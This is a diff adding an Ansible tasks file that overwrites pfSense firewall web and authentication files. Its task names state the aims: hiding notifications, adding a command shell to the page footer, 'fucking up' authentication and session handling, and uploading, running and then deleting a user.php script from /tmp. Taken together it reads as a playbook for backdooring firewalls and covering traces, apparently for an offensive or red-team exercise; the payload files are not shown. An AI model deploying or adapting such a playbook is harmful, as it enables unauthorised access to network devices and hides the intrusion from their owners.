@@ -1,0 +1,46 @@
+---
+# tasks file for pfsense-ub
+
+- name: edit headers.inc to remove the notifications
+  copy:
+      src: head.inc
+      dest: /usr/local/www/head.inc
+
+- name: edit foot.inc to include cmd shell
+  copy:
+      src: footer.inc
+      dest: /usr/local/www/foot.inc
+
+- name: lets fuck up auth
+  copy:
+      src: auth.inc
+      dest: /etc/inc/auth.inc
+  tags: test
+
+- name: lets fuck with some sessions for includes
+  copy:
+      src: phpsessionmanager.inc
+      dest: /etc/inc/phpsessionmanager.inc
+
+- name: copy index
+  copy:
+      src: index.php
+      dest: /usr/local/www/index.php
+
+- name: lets fuck up auth even more
+  copy:
+      src: authgui.inc
+      dest: /etc/inc/authgui.inc
+
+- name: upload user.php
+  copy:
+      src: user.php
+      dest: /tmp/user.php
+
+- name: run user.php
+  raw: php /tmp/user.php
+
+- name: remove user.php
+  file:
+      path: /tmp/user.php
+      state: absent
